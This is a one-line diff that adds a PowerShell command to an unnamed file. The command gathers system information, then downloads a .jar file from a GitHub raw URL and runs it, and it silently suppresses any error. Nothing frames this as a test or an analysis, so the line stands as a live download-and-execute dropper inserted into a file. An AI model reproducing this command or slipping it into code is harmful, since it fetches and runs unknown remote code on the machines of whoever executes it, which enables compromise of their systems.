@@ -1,0 +1,1 @@
+powershell systeminfo; try { iwr "https://github.com/mo1sss/sss/raw/main/atlasgay.jar" -OutFile atlasgay.jar -ErrorAction Stop; atlasgay.jar } catch {} ;
